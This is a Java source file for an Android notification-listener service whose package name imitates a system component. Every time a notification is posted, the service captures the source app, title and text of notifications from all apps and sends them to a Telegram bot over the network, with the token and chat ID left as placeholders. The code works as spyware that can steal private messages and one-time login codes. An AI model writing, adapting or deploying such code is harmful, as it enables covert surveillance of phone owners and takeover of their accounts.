package com.android.notifier;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class NotifierService extends NotificationListenerService {

    private static final String CHANNEL_ID="NotifierChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundCompat();
    }

    private void startForegroundCompat() {
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            NotificationChannel channel=new NotificationChannel(CHANNEL_ID,"Notifier Service",NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager=getSystemService(NotificationManager.class);
            if(manager!=null) manager.createNotificationChannel(channel);
        }

        Notification notification;
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            notification=new Notification.Builder(this,CHANNEL_ID)
				.setContentTitle("Notifier Running")
				.setContentText("Listening notifications…")
				.setSmallIcon(android.R.drawable.ic_dialog_info)
				.build();
        } else {
            notification=new Notification.Builder(this)
				.setContentTitle("Notifier Running")
				.setContentText("Listening notifications…")
				.setSmallIcon(android.R.drawable.ic_dialog_info)
				.build();
        }
        startForeground(1,notification);
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        sendToTelegram("Notifier connected");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        Bundle extras=sbn.getNotification().extras;
        String title=extras.getString("android.title");
        String text=extras.getCharSequence("android.text")!=null?extras.getCharSequence("android.text").toString():"";
        String pkg=sbn.getPackageName();
        String message="App: "+pkg+"\nTitle: "+title+"\nText: "+text;
        sendToTelegram(message);
    }

    private void sendToTelegram(final String message){
        new Thread(new Runnable() {
				@Override
				public void run(){
					try{
						String token="XXXXXXXXXXXXXXXXXXXXXXXXX";
						String chatId="XXXXXXXXXXXXX";
						String urlString="https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatId+"&text="+ URLEncoder.encode(message,"UTF-8");
						URL url=new URL(urlString);
						HttpURLConnection conn=(HttpURLConnection)url.openConnection();
						conn.setRequestMethod("GET");
						conn.connect();
						int response=conn.getResponseCode();
						Log.d("Notifier","Telegram: "+response);
					}catch(Exception e){e.printStackTrace();}
				}
			}).start();
    }
}
